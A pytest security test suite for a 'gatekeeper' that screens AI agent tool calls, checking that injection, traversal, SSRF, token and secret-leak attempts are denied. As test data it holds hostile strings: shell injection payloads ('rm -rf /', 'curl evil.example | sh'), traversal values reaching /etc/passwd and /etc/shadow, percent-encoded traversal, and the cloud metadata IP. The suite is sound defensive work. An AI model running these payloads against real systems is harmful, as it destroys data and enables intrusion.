"""Negative test corpus (REQUIREMENTS.md NFR-8).

Every test here describes an attack that **must fail**. A green run
proves no security -- a red run proves its absence, and that is exactly
what this corpus is for.
"""

from __future__ import annotations

import ipaddress
import os

import pytest
import yaml

from conftest import PYTHON, make_catalog
from gatekeeper.errors import ConfigError, Denied, DenialReason, OPAQUE_DENIAL
from gatekeeper.identity import verify_token
from gatekeeper.validate import (
    build_argv,
    build_http_request,
    build_rpc_call,
    check_protected,
    resolve_parameters,
    resolve_scopes,
)

# --------------------------------------------------------------------------
# Class 1: Metacharacters, line breaks, null bytes
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value",
    [
        "media; rm -rf /",
        "media && curl evil.example",
        "media | sh",
        "media`whoami`",
        "media$(id)",
        "media\nrm -rf /",
        "media\x00",
        "media\ttab",
        "media\r\ninjected",
        "media > /etc/passwd",
        "media\x1b[31m",
    ],
)
def test_metacharacters_rejected(catalog, value):
    """Values outside the allowlist are rejected -- no matter which character."""
    tool = catalog.get("demo.show")
    with pytest.raises(Denied) as exc:
        resolve_parameters(tool, {"stack": value})
    assert exc.value.reason in (
        DenialReason.PARAM_INVALID,
        DenialReason.CONTROL_CHARACTER,
    )


def test_control_characters_rejected_even_with_permissive_pattern(catalog):
    """FR-6.3: control characters are caught before the pattern applies.

    `demo.echo` allows practically everything via the pattern `^.+`.
    Control characters are still rejected because their presence is an
    attack indicator.
    """
    tool = catalog.get("demo.echo")
    with pytest.raises(Denied) as exc:
        resolve_parameters(tool, {"text": "harmless\x00after"})
    assert exc.value.reason is DenialReason.CONTROL_CHARACTER


# --------------------------------------------------------------------------
# Class 2: A parameter cannot produce a second argument (FR-5.4)
# --------------------------------------------------------------------------


def test_parameter_cannot_produce_second_argv_element(catalog, tier1):
    """The foundational guarantee of the entire design.

    The value contains spaces, semicolons, and shell syntax and passes
    the (deliberately permissive) pattern. It still lands as **one** list
    element in argv -- there is no interpreter that could split it.
    """
    tool = catalog.get("demo.echo")
    hostile = "harmless; rm -rf / && curl evil.example | sh"
    values = resolve_parameters(tool, {"text": hostile})
    argv = build_argv(tool, values, tier1.toolkit("demo"))

    assert argv == [PYTHON, "-c", "import sys; print(sys.argv[1])", hostile]
    assert len(argv) == 4
    assert argv[3] == hostile  # unchanged, but isolated


def test_denied_arg_caught_after_substitution(tmp_path, tier1):
    """FR-4.2 operates on the *resolved* argv, not on the template.

    The template is harmless; only the parameter value turns it into a
    blocked argument.
    """
    catalog = make_catalog(
        tmp_path,
        tier1,
        [
            {
                "id": "demo.passthru",
                "toolkit": "demo",
                "binary": PYTHON,
                "title": "x",
                "description": "x",
                "category": "read",
                "idempotent": True,
                "enabled": True,
                "argv": ["{word}"],
                "parameters": {
                    "word": {
                        "type": "string",
                        "required": True,
                        "pattern": "^[a-z-]+$",
                        "description": "x",
                    }
                },
                "required_scopes": [],
                "timeout_seconds": 5,
                "max_output_bytes": 1024,
            }
        ],
    )
    tool = catalog.get("demo.passthru")
    values = resolve_parameters(tool, {"word": "rm"})
    with pytest.raises(Denied) as exc:
        build_argv(tool, values, tier1.toolkit("demo"))
    assert exc.value.reason is DenialReason.TIER1_VIOLATION


# --------------------------------------------------------------------------
# Class 3: Path traversal and symlink escape
# --------------------------------------------------------------------------


def test_traversal_blocked_by_pattern(catalog):
    """`..` never even gets through the stack name allowlist."""
    tool = catalog.get("demo.show")
    for attempt in ["../etc", "..", "a/../../b", "/etc/passwd"]:
        with pytest.raises(Denied):
            resolve_parameters(tool, {"stack": attempt})


def test_symlink_escape_blocked(tmp_path, tier1, sandbox, catalog):
    """FR-4.3: `realpath` resolves the symlink, the root check fails.

    The stack name is completely regular -- the escape is in the
    filesystem, not in the input. That is why a pattern check on the
    name alone is not sufficient.
    """
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "compose.yaml").write_text("services: {}\n", encoding="utf-8")
    link = sandbox / "escape"
    try:
        os.symlink(outside, link, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("Symlinks require elevated privileges on this system")

    tool = catalog.get("demo.show")
    with pytest.raises(Denied) as exc:
        resolve_parameters(tool, {"stack": "escape"})
    assert exc.value.reason is DenialReason.PATH_ESCAPE


def test_sibling_directory_prefix_not_confused_for_child(tmp_path, tier1):
    """`/raid-evil` must not count as being below `/raid`.

    A pure string prefix comparison would have let this through -- that
    is why the check runs via `commonpath`.
    """
    sibling = tmp_path / "raid-evil"
    sibling.mkdir()
    (sibling / "compose.yaml").write_text("x", encoding="utf-8")

    catalog = make_catalog(
        tmp_path,
        tier1,
        [
            {
                "id": "demo.sibling",
                "toolkit": "demo",
                "binary": PYTHON,
                "title": "x",
                "description": "x",
                "category": "read",
                "idempotent": True,
                "enabled": True,
                "argv": ["{path}"],
                "parameters": {
                    "path": {
                        "type": "path",
                        # Deliberately points to the sibling directory.
                        "derived": str(sibling / "compose.yaml"),
                        "must_resolve_under": str(tmp_path / "raid"),
                        "description": "x",
                    }
                },
                "required_scopes": [],
                "timeout_seconds": 5,
                "max_output_bytes": 1024,
            }
        ],
    )
    with pytest.raises(Denied) as exc:
        resolve_parameters(catalog.get("demo.sibling"), {})
    assert exc.value.reason is DenialReason.PATH_ESCAPE


# --------------------------------------------------------------------------
# Class 4: Tier 1 violations are caught at load time
# --------------------------------------------------------------------------


def test_binary_outside_allowlist_rejected(tmp_path, tier1):
    """FR-4.1: a non-approved binary does not exist."""
    with pytest.raises(ConfigError) as exc:
        make_catalog(
            tmp_path,
            tier1,
            [
                {
                    "id": "demo.evil",
                    "toolkit": "demo",
                    "binary": "/bin/sh",
                    "title": "x",
                    "description": "x",
                    "category": "write",
                    "enabled": True,
                    "argv": ["-c", "id"],
                    "parameters": {},
                    "required_scopes": [],
                }
            ],
        )
    assert "allowlist" in str(exc.value)


def test_unknown_toolkit_rejected(tmp_path, tier1):
    with pytest.raises(ConfigError):
        make_catalog(
            tmp_path,
            tier1,
            [
                {
                    "id": "ghost.tool",
                    "toolkit": "ghost",
                    "binary": PYTHON,
                    "title": "x",
                    "description": "x",
                    "category": "read",
                    "enabled": True,
                    "argv": [],
                    "parameters": {},
                    "required_scopes": [],
                }
            ],
        )


def test_timeout_above_toolkit_ceiling_rejected(tmp_path, tier1):
    """FR-4.5: a tool may stay below the toolkit limits, never exceed them."""
    with pytest.raises(ConfigError) as exc:
        make_catalog(
            tmp_path,
            tier1,
            [
                {
                    "id": "demo.slow",
                    "toolkit": "demo",
                    "binary": PYTHON,
                    "title": "x",
                    "description": "x",
                    "category": "read",
                    "enabled": True,
                    "argv": [],
                    "parameters": {},
                    "required_scopes": [],
                    "timeout_seconds": 9999,
                }
            ],
        )
    assert "exceeds" in str(exc.value)


def test_string_parameter_without_pattern_rejected(tmp_path, tier1):
    """FR-5.7: there is no unvalidated free-text parameter."""
    with pytest.raises(ConfigError) as exc:
        make_catalog(
            tmp_path,
            tier1,
            [
                {
                    "id": "demo.free",
                    "toolkit": "demo",
                    "binary": PYTHON,
                    "title": "x",
                    "description": "x",
                    "category": "read",
                    "enabled": True,
                    "argv": ["{anything}"],
                    "parameters": {
                        "anything": {"type": "string", "description": "free"}
                    },
                    "required_scopes": [],
                }
            ],
        )
    assert "FR-5.7" in str(exc.value)


def test_path_root_outside_toolkit_rejected(tmp_path, tier1):
    """FR-4.10: a tool cannot extend the path roots of its toolkit."""
    with pytest.raises(ConfigError):
        make_catalog(
            tmp_path,
            tier1,
            [
                {
                    "id": "demo.wide",
                    "toolkit": "demo",
                    "binary": PYTHON,
                    "title": "x",
                    "description": "x",
                    "category": "read",
                    "enabled": True,
                    "argv": ["{p}"],
                    "parameters": {
                        "p": {
                            "type": "path",
                            "derived": "/etc/{x}",
                            "must_resolve_under": "/etc",
                            "description": "x",
                        },
                        "x": {
                            "type": "string",
                            "pattern": "^[a-z]+$",
                            "description": "x",
                        },
                    },
                    "required_scopes": [],
                }
            ],
        )


# --------------------------------------------------------------------------
# Class 5: Derived parameters cannot be overridden
# --------------------------------------------------------------------------


def test_derived_parameter_cannot_be_supplied(catalog):
    """FR-5.5: sending the derived path bypasses the derivation."""
    tool = catalog.get("demo.show")
    with pytest.raises(Denied) as exc:
        resolve_parameters(
            tool, {"stack": "media-jellyfin", "compose_path": "/etc/shadow"}
        )
    assert exc.value.reason is DenialReason.PARAM_DERIVED_SUPPLIED


def test_unknown_parameter_rejected(catalog):
    tool = catalog.get("demo.show")
    with pytest.raises(Denied) as exc:
        resolve_parameters(tool, {"stack": "media-jellyfin", "extra": "x"})
    assert exc.value.reason is DenialReason.PARAM_UNKNOWN


# --------------------------------------------------------------------------
# Class 6: Protected resources (FR-4.12)
# --------------------------------------------------------------------------


def test_protected_resource_blocked(catalog, tier1):
    """The stack name is regular, the path exists, the permission covers it.

    Only the block list knows that this would terminate gatekeeper itself.
    """
    tool = catalog.get("demo.show")
    values = resolve_parameters(tool, {"stack": "gatekeeper"})
    scopes = resolve_scopes(tool, values)
    with pytest.raises(Denied) as exc:
        check_protected(scopes, tier1.toolkit("demo"))
    assert exc.value.reason is DenialReason.PROTECTED_RESOURCE


# --------------------------------------------------------------------------
# Class 7: Denials reveal nothing about the catalog (FR-7.7)
# --------------------------------------------------------------------------


async def test_denial_is_indistinguishable(service, identities):
    """Missing permission and non-existent tool yield the same response."""
    store, _ = identities
    narrow = store.identities["narrow"]

    with pytest.raises(Denied) as missing_right:
        await service.call(narrow, "demo.echo", {"text": "hello"})
    with pytest.raises(Denied) as no_such_tool:
        await service.call(narrow, "demo.does_not_exist", {})

    assert missing_right.value.agent_message == no_such_tool.value.agent_message
    assert missing_right.value.agent_message == OPAQUE_DENIAL
    # Internally the reasons remain distinguishable - that is what the audit log is for.
    assert missing_right.value.reason is DenialReason.NOT_GRANTED
    assert no_such_tool.value.reason is DenialReason.UNKNOWN_TOOL


async def test_scope_mismatch_is_opaque(service, identities):
    store, _ = identities
    narrow = store.identities["narrow"]
    with pytest.raises(Denied) as exc:
        await service.call(narrow, "demo.show", {"stack": "dev-thing"})
    assert exc.value.reason is DenialReason.SCOPE_MISMATCH
    assert exc.value.agent_message == OPAQUE_DENIAL


def test_invisible_tools_stay_invisible(service, identities):
    """FR-1.4: `tools/list` shows only what the identity is allowed to call."""
    store, _ = identities
    names = {v.name for v in service.visible_tools(store.identities["narrow"])}
    assert names == {"demo.show"}


# --------------------------------------------------------------------------
# Class 8: Tokens
# --------------------------------------------------------------------------


def test_wrong_token_rejected(identities):
    store, tokens = identities
    assert store.authenticate(tokens["full"]).id == "full"
    assert store.authenticate("gk_wrong") is None
    assert store.authenticate("") is None


def test_token_hash_is_salted(identities):
    """Same token, two hashes -- otherwise a rainbow table would be possible."""
    from gatekeeper.identity import hash_token

    first, second = hash_token("same-token"), hash_token("same-token")
    assert first != second
    assert verify_token("same-token", first)
    assert verify_token("same-token", second)


def test_unauthenticated_token_scan_is_not_a_dos(tmp_path):
    """A garbage bearer token must not cost O(identity count) scrypt calls.

    This is what made an unauthenticated request able to stall the whole
    event loop before `token_lookup` existed (identity.py's `authenticate`):
    scrypt runs once per identity in the file, every time, on purpose --
    to avoid revealing which one matched. With every identity carrying its
    fast `token_lookup` index, a bad token should cost roughly one dict
    miss, not N scrypt verifications.
    """
    import time

    from gatekeeper.identity import (
        Identity,
        IdentityStore,
        generate_token,
        hash_token,
        hash_token_lookup,
    )

    tokens = [generate_token() for _ in range(100)]
    store = IdentityStore(
        {
            f"agent-{i}": Identity(
                id=f"agent-{i}",
                role="agent",
                token_hash=hash_token(tok),
                token_lookup=hash_token_lookup(tok),
                tools=frozenset(),
                scopes=(),
            )
            for i, tok in enumerate(tokens)
        }
    )

    started = time.perf_counter()
    assert store.authenticate("gk_" + "x" * 43) is None
    elapsed = time.perf_counter() - started
    # A single scrypt verification alone costs ~50ms (identity.py's
    # SCRYPT_N comment); 100 of them would be ~5s. Well under one
    # verification's worth of time proves no scrypt call happened at all.
    assert elapsed < 0.05

    # Every identity still authenticates correctly, and lookup cost does
    # not depend on position in the file -- both would fail if the index
    # were somehow scoped to only the first/last entries.
    first = time.perf_counter()
    assert store.authenticate(tokens[0]).id == "agent-0"
    first_elapsed = time.perf_counter() - first

    last = time.perf_counter()
    assert store.authenticate(tokens[-1]).id == "agent-99"
    last_elapsed = time.perf_counter() - last

    # Both cost about one scrypt verification, not N of them.
    assert first_elapsed < 0.5
    assert last_elapsed < 0.5


def test_token_lookup_index_survives_in_place_identity_swap(tmp_path):
    """`store.py._write_identities` replaces `IdentityStore.identities` in
    place on the same `IdentityStore` object (so `AuthMiddleware`'s
    reference stays valid across a write) -- the index must therefore be
    rebuilt from whatever `.identities` currently holds, never cached from
    construction time, or a freshly created/rotated identity would
    authenticate as nobody.
    """
    from gatekeeper.identity import (
        Identity,
        IdentityStore,
        generate_token,
        hash_token,
        hash_token_lookup,
    )

    store = IdentityStore({})
    assert store.authenticate("gk_anything") is None

    token = generate_token()
    store.identities = {
        "fresh": Identity(
            id="fresh",
            role="agent",
            token_hash=hash_token(token),
            token_lookup=hash_token_lookup(token),
            tools=frozenset(),
            scopes=(),
        )
    }
    assert store.authenticate(token).id == "fresh"


def test_mixed_indexed_and_unindexed_identities_both_authenticate(tmp_path):
    """An identities.yaml partway through migration -- some entries carry
    `token_lookup`, some (written by an older gatekeeper) don't -- must
    authenticate correctly for both kinds, and a bad token must not match
    either.
    """
    from gatekeeper.identity import (
        Identity,
        IdentityStore,
        generate_token,
        hash_token,
        hash_token_lookup,
    )

    indexed_token = generate_token()
    legacy_token = generate_token()
    store = IdentityStore(
        {
            "indexed": Identity(
                id="indexed",
                role="agent",
                token_hash=hash_token(indexed_token),
                token_lookup=hash_token_lookup(indexed_token),
                tools=frozenset(),
                scopes=(),
            ),
            "legacy": Identity(
                id="legacy",
                role="agent",
                token_hash=hash_token(legacy_token),
                tools=frozenset(),
                scopes=(),
            ),
        }
    )

    assert store.authenticate(indexed_token).id == "indexed"
    assert store.authenticate(legacy_token).id == "legacy"
    assert store.authenticate("gk_wrong") is None


def test_token_lookup_field_round_trips_through_yaml(tmp_path):
    """`load_identities`/`to_spec` must not drop `token_lookup` on a
    write-then-reload cycle -- otherwise every reload of identities.yaml
    would silently fall an identity back to the slow, un-indexed path.
    """
    from gatekeeper.identity import (
        dump_identities,
        generate_token,
        hash_token,
        hash_token_lookup,
        load_identities,
    )

    token = generate_token()
    path = tmp_path / "identities.yaml"
    path.write_text(
        yaml.safe_dump(
            {
                "identities": [
                    {
                        "id": "a",
                        "role": "agent",
                        "token_hash": hash_token(token),
                        "token_lookup": hash_token_lookup(token),
                        "tools": [],
                        "scopes": [],
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    store = load_identities(str(path))
    assert store.identities["a"].token_lookup == hash_token_lookup(token)

    dumped = dump_identities(store)
    assert dumped["identities"][0]["token_lookup"] == hash_token_lookup(token)


def test_malformed_token_lookup_rejected(tmp_path):
    """`token_lookup` is computed, never hand-typed -- a value that is not
    a 64-character hex SHA-256 digest is refused at load time rather than
    silently never matching anything.
    """
    from gatekeeper.identity import hash_token, load_identities

    path = tmp_path / "identities.yaml"
    path.write_text(
        yaml.safe_dump(
            {
                "identities": [
                    {
                        "id": "a",
                        "role": "agent",
                        "token_hash": hash_token("whatever"),
                        "token_lookup": "not-a-hex-digest",
                        "tools": [],
                        "scopes": [],
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(ConfigError, match="token_lookup"):
        load_identities(str(path))


def test_wildcard_in_tool_grant_rejected(tmp_path):
    """FR-7.5: no grants at toolkit level, not even as a wildcard."""
    import yaml as _yaml

    from gatekeeper.identity import hash_token, load_identities

    path = tmp_path / "identities.yaml"
    path.write_text(
        _yaml.safe_dump(
            {
                "identities": [
                    {
                        "id": "sloppy",
                        "role": "agent",
                        "token_hash": hash_token("x"),
                        "tools": ["docker.*"],
                        "scopes": ["stack:*"],
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(ConfigError) as exc:
        load_identities(str(path))
    assert "FR-7.5" in str(exc.value)


def test_placeholder_token_hash_refuses_start(tmp_path):
    """The example file must not accidentally go into production."""
    import yaml as _yaml

    from gatekeeper.identity import load_identities

    path = tmp_path / "identities.yaml"
    path.write_text(
        _yaml.safe_dump(
            {
                "identities": [
                    {
                        "id": "homelab",
                        "role": "agent",
                        "token_hash": "scrypt$REPLACE_ME",
                        "tools": [],
                        "scopes": [],
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(ConfigError) as exc:
        load_identities(str(path))
    assert "gatekeeper token" in str(exc.value)


# --------------------------------------------------------------------------
# Class 9: Masking of secrets in output (FR-10.6)
# --------------------------------------------------------------------------


def test_secrets_masked_in_audit(tmp_path):
    import json

    from gatekeeper.audit import AuditLog, Redactor

    log = AuditLog(str(tmp_path / "logs"), redactor=Redactor(secrets=("s3cret",)))
    log.call(
        identity="dev",
        tool_id="demo.echo",
        tool_version=1,
        parameters={"text": "API_KEY=s3cret", "token": "gk_secret"},
        scopes=[],
        outcome="ok",
    )
    written = (tmp_path / "logs" / "audit.jsonl").read_text(encoding="utf-8")
    assert "s3cret" not in written
    assert "gk_secret" not in written
    record = json.loads(written.splitlines()[0])
    assert record["parameters"]["text"] == "API_KEY=***"
    assert record["parameters"]["token"] == "***"


def test_secret_field_names_masked_in_every_spelling(tmp_path):
    """A key-shaped *parameter name* is masked however it is spelled.

    The Redactor is no backstop here: it only knows values gatekeeper
    stores itself, and these are values an agent passed in as arguments.
    So the field-name rule has to catch them on its own -- and it used to
    match names exactly, which meant `api_key` was masked and `apikey`,
    `x-api-key` and `access_token` went to disk in cleartext.
    """
    import json

    from gatekeeper.audit import AuditLog

    log = AuditLog(str(tmp_path / "logs"))
    log.call(
        identity="dev",
        tool_id="demo.echo",
        tool_version=1,
        parameters={
            "apikey": "leak-1",
            "api_key": "leak-2",
            "X-Api-Key": "leak-3",
            "access_token": "leak-4",
            "client_secret": "leak-5",
            "Authorization": "leak-6",
            "userPassword": "leak-7",
            "nested": {"x-api-key": "leak-8"},
            "stack": "media-jellyfin",
        },
        scopes=[],
        outcome="ok",
    )
    written = (tmp_path / "logs" / "audit.jsonl").read_text(encoding="utf-8")
    for index in range(1, 9):
        assert f"leak-{index}" not in written
    # Masking that swallowed everything would pass the loop above and be
    # useless -- a field with no secret in its name still has to survive.
    record = json.loads(written.splitlines()[0])
    assert record["parameters"]["stack"] == "media-jellyfin"


def test_credential_metadata_survives_masking(tmp_path):
    """The names of the credentials used are *not* masked away (FR-10.7).

    The field-name rule above is deliberately broad, which puts it one
    careless token away from deleting the very metadata the log exists
    for: which key a call used, so it can be rotated after a leak.
    """
    import json

    from gatekeeper.audit import AuditLog

    log = AuditLog(str(tmp_path / "logs"))
    log.call(
        identity="dev",
        tool_id="jellyfin.request",
        tool_version=1,
        parameters={},
        scopes=[],
        outcome="ok",
        credential_names=["jellyfin"],
    )
    record = json.loads(
        (tmp_path / "logs" / "audit.jsonl").read_text(encoding="utf-8").splitlines()[0]
    )
    assert record["credentials"] == ["jellyfin"]


# --------------------------------------------------------------------------
# Class 10: HTTP target allowlist and path traversal (FR-8.5 to FR-8.15)
# --------------------------------------------------------------------------


def _http_tier1(tmp_path, *, allowed_cidrs, allowed_path_prefixes=("/api/",)):
    from gatekeeper.tier1 import load_tier1

    prefixes = "\n".join(f'      - "{p}"' for p in allowed_path_prefixes)
    cidrs = "\n".join(f'      - "{c}"' for c in allowed_cidrs)
    path = tmp_path / "toolkits.yaml"
    path.write_text(
        "toolkits:\n"
        "  demo_http:\n"
        "    executor: http\n"
        '    base_url: "http://127.0.0.1:1"\n'
        '    allowed_methods: ["GET", "POST"]\n'
        "    allowed_path_prefixes:\n"
        f"{prefixes}\n"
        "    allowed_cidrs:\n"
        f"{cidrs}\n"
        f"audit:\n  dir: {tmp_path / 'logs'}\n",
        encoding="utf-8",
    )
    return load_tier1(str(path))


def _http_tool(tier1, **overrides):
    from gatekeeper.catalog import parse_tool_spec

    spec = {
        "id": "demo_http.get_thing", "toolkit": "demo_http", "version": 1,
        "title": "Get thing", "description": "test", "category": "read",
        "enabled": True, "method": "GET", "path": "/api/thing/{name}",
        "parameters": {"name": {"type": "string", "pattern": "^.*$", "required": True}},
        "timeout_seconds": 5, "max_output_bytes": 65536,
    }
    spec.update(overrides)
    return parse_tool_spec(spec, tier1)


def test_path_traversal_via_parameter_rejected(tmp_path):
    """A parameter value cannot walk the resolved path outside the prefix (FR-8.7)."""
    tier1 = _http_tier1(tmp_path, allowed_cidrs=["127.0.0.1/32"])
    toolkit = tier1.toolkit("demo_http")
    tool = _http_tool(tier1)
    with pytest.raises(Denied) as exc:
        build_http_request(tool, {"name": "../../../etc/passwd"}, toolkit)
    assert exc.value.reason is DenialReason.PATH_ESCAPE


def test_path_escape_is_rejected_not_normalized(tmp_path):
    """FR-8.7: '..' is refused outright, never silently collapsed."""
    tier1 = _http_tier1(tmp_path, allowed_cidrs=["127.0.0.1/32"])
    toolkit = tier1.toolkit("demo_http")
    tool = _http_tool(tier1)
    with pytest.raises(Denied):
        build_http_request(tool, {"name": ".."}, toolkit)


@pytest.mark.parametrize(
    "encoded", ["%2e%2e", "%2E%2E", "%2e%2e%2f", "..%2f..%2fetc"]
)
def test_percent_encoded_path_traversal_rejected(tmp_path, encoded):
    """FR-8.7's ban on '..' must survive a percent-encoded segment too.

    `allows_path`'s prefix check only inspects the path the way gatekeeper
    sends it -- the target server decodes percent-escapes before
    interpreting the path, so an unencoded check alone would let
    `%2e%2e%2f` reach the network looking like an ordinary segment and
    resolve to `../` on the other end.
    """
    tier1 = _http_tier1(tmp_path, allowed_cidrs=["127.0.0.1/32"])
    toolkit = tier1.toolkit("demo_http")
    tool = _http_tool(tier1)
    with pytest.raises(Denied) as exc:
        build_http_request(tool, {"name": encoded}, toolkit)
    assert exc.value.reason is DenialReason.PATH_ESCAPE


def test_allows_path_prefix_boundary_not_a_bare_startswith(tmp_path):
    """A prefix without a trailing slash must match at a segment boundary.

    `allowed_path_prefixes: ["/api/v3/series"]` must allow
    `/api/v3/series/123` and the bare `/api/v3/series` itself, but not
    `/api/v3/seriesXYZ` -- the same ambiguity `validate.py`'s
    `_resolve_path` already closes on the filesystem side via
    `commonpath` instead of a string prefix (`/mnt/raid` vs.
    `/mnt/raid-evil`).
    """
    tier1 = _http_tier1(
        tmp_path,
        allowed_cidrs=["127.0.0.1/32"],
        allowed_path_prefixes=("/api/v3/series",),
    )
    toolkit = tier1.toolkit("demo_http")
    assert toolkit.allows_path("/api/v3/series")
    assert toolkit.allows_path("/api/v3/series/123")
    assert not toolkit.allows_path("/api/v3/seriesXYZ")
    assert not toolkit.allows_path("/api/v3/serie")


def test_allows_path_prefix_with_trailing_slash_unaffected(tmp_path):
    """The common case (`allowed_path_prefixes: ["/api/"]`) is unchanged --

    a prefix already ending in '/' has its boundary built in.
    """
    tier1 = _http_tier1(tmp_path, allowed_cidrs=["127.0.0.1/32"])
    toolkit = tier1.toolkit("demo_http")
    assert toolkit.allows_path("/api/thing/widgets")
    assert not toolkit.allows_path("/apix/thing")


def test_toolkit_credential_never_reachable_via_query_or_body_template():
    """A tool definition's own query/body templates cannot smuggle a

    credential-shaped key -- there is structurally no path from a tool
    definition to `credential.value`: `execute_http.py`'s credential
    injection is a separate step the tool's `query_template`/`body_template`
    dicts are never consulted for (see `_credential_headers`, which reads
    only from the resolved `ResolvedCredential`, never from `query`/`body`).
    """
    from gatekeeper import execute_http

    assert "query" not in execute_http._credential_headers.__code__.co_names
    assert "body" not in execute_http._credential_headers.__code__.co_names


@pytest.mark.parametrize(
    "target_ip",
    ["192.168.1.1", "10.0.0.1", "172.16.0.1", "169.254.169.254"],
)
def test_ssrf_blocked_for_addresses_outside_allowed_cidrs(tmp_path, target_ip):
    """FR-8.9: the toolkit's CIDR allowlist, not a blanket private-range

    ban, is what decides -- and it fails closed for anything not
    explicitly listed, including the cloud metadata address.
    """
    tier1 = _http_tier1(tmp_path, allowed_cidrs=["203.0.113.1/32"])
    toolkit = tier1.toolkit("demo_http")
    assert not toolkit.in_allowed_cidrs(ipaddress.ip_address(target_ip))


def test_narrow_cidr_does_not_cover_neighboring_host(tmp_path):
    """FR-8.15: a /32 for one host must not accidentally cover its neighbor."""
    tier1 = _http_tier1(tmp_path, allowed_cidrs=["192.168.1.42/32"])
    toolkit = tier1.toolkit("demo_http")
    assert toolkit.in_allowed_cidrs(ipaddress.ip_address("192.168.1.42"))
    assert not toolkit.in_allowed_cidrs(ipaddress.ip_address("192.168.1.43"))


def test_disallowed_http_method_rejected_at_load(tmp_path):
    tier1 = _http_tier1(tmp_path, allowed_cidrs=["127.0.0.1/32"])
    from gatekeeper.errors import Tier1Violation

    with pytest.raises(Tier1Violation):
        _http_tool(tier1, id="demo_http.delete_thing", method="DELETE")


def test_path_outside_allowed_prefix_rejected_at_load(tmp_path):
    tier1 = _http_tier1(tmp_path, allowed_cidrs=["127.0.0.1/32"])
    from gatekeeper.errors import Tier1Violation

    with pytest.raises(Tier1Violation):
        _http_tool(tier1, id="demo_http.other", path="/other/{name}")


def test_follow_redirects_true_is_rejected_at_load(tmp_path):
    """FR-8.8 is not a configurable knob -- a toolkit cannot opt back in."""
    path = tmp_path / "toolkits.yaml"
    path.write_text(
        "toolkits:\n"
        "  demo_http:\n"
        "    executor: http\n"
        '    base_url: "http://127.0.0.1:1"\n'
        '    allowed_methods: ["GET"]\n'
        '    allowed_path_prefixes: ["/api/"]\n'
        '    allowed_cidrs: ["127.0.0.1/32"]\n'
        "    follow_redirects: true\n"
        f"audit:\n  dir: {tmp_path / 'logs'}\n",
        encoding="utf-8",
    )
    from gatekeeper.tier1 import load_tier1

    with pytest.raises(ConfigError):
        load_tier1(str(path))


# --------------------------------------------------------------------------
# Class 11: RPC method whitelist (FR-8.3c/FR-8.3d)
# --------------------------------------------------------------------------


def _truenas_tier1(tmp_path, allowed_rpc_methods):
    from gatekeeper.tier1 import load_tier1

    methods = "\n".join(f"      - {m}" for m in allowed_rpc_methods)
    path = tmp_path / "toolkits.yaml"
    path.write_text(
        "toolkits:\n"
        "  demo_truenas:\n"
        "    executor: truenas\n"
        '    ws_url: "wss://127.0.0.1:1/api/current"\n'
        "    allowed_rpc_methods:\n"
        f"{methods}\n"
        f"audit:\n  dir: {tmp_path / 'logs'}\n",
        encoding="utf-8",
    )
    return load_tier1(str(path))


def test_rpc_method_not_on_whitelist_rejected_at_load(tmp_path):
    from gatekeeper.catalog import parse_tool_spec
    from gatekeeper.errors import Tier1Violation

    tier1 = _truenas_tier1(tmp_path, ["pool.query"])
    spec = {
        "id": "demo_truenas.delete_dataset", "toolkit": "demo_truenas", "version": 1,
        "title": "x", "description": "x", "category": "write", "enabled": True,
        "method": "pool.dataset.delete", "params": {},
        "parameters": {}, "required_scopes": [],
        "timeout_seconds": 10, "max_output_bytes": 4096,
    }
    with pytest.raises(Tier1Violation):
        parse_tool_spec(spec, tier1)


@pytest.mark.parametrize(
    "malicious_value",
    ["tank; pool.dataset.delete", "tank\npool.dataset.delete", "tank\x00"],
)
def test_rpc_param_value_cannot_change_the_method(tmp_path, malicious_value):
    from gatekeeper.catalog import parse_tool_spec

    tier1 = _truenas_tier1(tmp_path, ["pool.dataset.create"])
    spec = {
        "id": "demo_truenas.create_dataset", "toolkit": "demo_truenas", "version": 1,
        "title": "x", "description": "x", "category": "write", "enabled": True,
        "method": "pool.dataset.create", "params": {"name": "{name}"},
        "parameters": {"name": {"type": "string", "pattern": "^.*$", "required": True}},
        "required_scopes": [], "timeout_seconds": 10, "max_output_bytes": 4096,
    }
    tool = parse_tool_spec(spec, tier1)
    toolkit = tier1.toolkit("demo_truenas")
    try:
        resolved = resolve_parameters(tool, {"name": malicious_value})
    except Denied:
        # Control characters are rejected before ever reaching build_rpc_call --
        # also a pass, since the method still cannot be changed.
        return
    method, params = build_rpc_call(tool, resolved, toolkit)
    assert method == "pool.dataset.create"
    assert params["name"] == malicious_value